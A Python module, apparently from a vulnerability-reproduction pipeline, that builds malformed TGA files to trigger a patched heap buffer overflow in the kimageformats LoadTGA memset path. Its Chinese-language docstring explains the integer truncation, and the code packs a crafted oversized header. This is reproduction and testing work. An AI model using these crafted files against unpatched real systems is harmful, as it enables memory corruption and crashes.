"""CG-27（arvo:12818 / kimageformats TGA）构造器。

**缺陷**：src/imageformats/tga.cpp 的 LoadTGA() 非 RLE 分支：

    const int dataRead = s.readRawData((char *)image, size);   /* size 是 qint64 */
    if (dataRead < size) {
        memset(&image[dataRead], 0, size - dataRead);          /* 第 264 行 */
    }

readRawData 的第二个参数是 int：当 size = width*height*pixel_size 超过 INT_MAX 时
被截断成负数，QBuffer 直接拒绝（"Called with maxSize < 0"）并返回 -1；
于是 memset(&image[-1], 0, size+1) —— 从堆缓冲前一个字节开始写 size+1 个字节，
官方报 WRITE of size 3543977217。

patch 补的是 dataRead < 0 时直接 return false（调色板分支同理）。

**TGA 头（18 字节，小端）**：
    [0] idLength [1] colorMapType [2] imageType
    [3..7] colorMap 规格(5) [8..11] x/y origin(4)
    [12..13] width [14..15] height [16] pixelDepth [17] flags

只要 width*height*pixel_size > 2^31，就会走到这条路径；文件本身可以很短（截断即可）。
"""
from __future__ import annotations

import struct

MAX_DIM = 65535
FIELDS = {
    "width": "int(1..65535), 图像宽（默认 65535）",
    "height": "int(1..65535), 图像高（默认 65535）",
    "pixel_size": "int, 每像素字节数 1/2/3/4（默认 1，对应 8bpp）",
    "image_type": "int(0..3), 2=真彩 3=灰度 1=调色板 0=无（默认 3）",
    "rle": "int(0|1), 置 1 走 RLE 解码分支（默认 0，走 memset 那条）",
    "payload": "int(0..64), 头部之后附加的像素字节数（默认 4，必然被截断）",
}

DECLARED_SINK = {
    "file": "src/imageformats/tga.cpp",
    "line": 264,
    "symbol": "memset",
    "note": "readRawData 返回 -1 时 memset(&image[-1], 0, size+1)，size 由头部宽高*位深控制",
}


class TgaResult:
    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "tga"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def build(fields: dict) -> TgaResult:
    fields = dict(fields or {})
    try:
        width = int(fields.get("width", MAX_DIM))
        height = int(fields.get("height", MAX_DIM))
        pixel_size = int(fields.get("pixel_size", 1))
        image_type = int(fields.get("image_type", 3))
        rle = int(fields.get("rle", 0))
        payload = int(fields.get("payload", 4))
    except (TypeError, ValueError):
        return TgaResult(False, reason="width/height/pixel_size/image_type/rle/payload 必须是整数")
    if not 1 <= width <= MAX_DIM or not 1 <= height <= MAX_DIM:
        return TgaResult(False, reason="width/height 越界（1..65535）: %d/%d" % (width, height))
    if pixel_size not in (1, 2, 3, 4):
        return TgaResult(False, reason="pixel_size 只认 1/2/3/4: %d" % pixel_size)
    if image_type not in (0, 1, 2, 3):
        return TgaResult(False, reason="image_type 只认 0..3: %d" % image_type)
    if not 0 <= payload <= 64:
        return TgaResult(False, reason="payload 越界（0..64）: %d" % payload)

    bpp = pixel_size * 8
    flags = 0x20 if rle else 0
    header = struct.pack("<BBBHHBHHHHBB",
                         0,            # idLength
                         0,            # colorMapType
                         image_type,
                         0, 0, 0,      # colormap spec
                         0, 0,         # xOrigin/yOrigin
                         width, height,
                         bpp,
                         flags)
    assert len(header) == 18, len(header)
    total = width * height * pixel_size
    data = header + b"\x00" * payload
    used = {"width": width, "height": height, "pixel_size": pixel_size, "bpp": bpp,
            "image_type": image_type, "rle": rle, "payload": payload,
            "declared_size": total, "bytes": len(data)}
    if total <= 0x7FFFFFFF:
        used["warning"] = "declared_size=%d <= INT_MAX，readRawData 不会返回 -1" % total
    known = set(FIELDS)
    dropped = [{"field": k, "reason": "tga 构造器不识别该字段"}
               for k in fields if k not in known]
    return TgaResult(True, data, used, dropped, "")


def declared_claim() -> dict:
    """构造器自带主张：readRawData 失败后 memset 用 size+1 写穿堆缓冲。"""
    return {
        "claim_id": "cg27-tga-memset",
        "subject": "LoadTGA",
        "proposed_by": "builder",
        "subject_source": "builder",
        "evidence_source": "agent/builders/tga.py + arvo error.txt",
        "cwe": "CWE-122",
        "sink": dict(DECLARED_SINK),
        "test_plan": {"format": "tga"},
    }


def fields_spec() -> dict:
    return dict(FIELDS)


if __name__ == "__main__":
    r = build({})
    assert r.ok, r.reason
    assert r.size == 18 + 4
    assert r.fields_used["declared_size"] == 65535 * 65535
    assert r.data[2] == 3 and r.data[16] == 8
    small = build({"width": 4, "height": 4})
    assert small.ok and "warning" in small.fields_used
    assert not build({"width": 0}).ok
    assert not build({"pixel_size": 5}).ok
    assert not build({"image_type": 9}).ok
    assert build({"unknown": 1}).dropped
    c = declared_claim()
    assert c["subject"] == "LoadTGA" and c["sink"]["line"] == 264
    print("tga builder self-check OK:", r.to_record())
